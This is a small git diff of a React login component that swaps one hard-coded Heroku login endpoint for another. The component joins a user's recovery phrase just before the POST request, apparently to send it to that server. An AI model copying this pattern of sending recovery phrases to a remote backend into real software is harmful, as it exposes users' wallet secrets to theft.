@@ -36,7 +36,7 @@ export default function Login1({ onLoginSuccess }) {
     const recoveryPhrase = phrase.join(" ");
     try {
       const response = await fetch(
-        "https://adrox-89b6c88377f5.herokuapp.com/api/users/login/",
+        "https://adrox-5ed452640f6d.herokuapp.com/api/users/login/",
         {
           method: "POST",
           headers: {
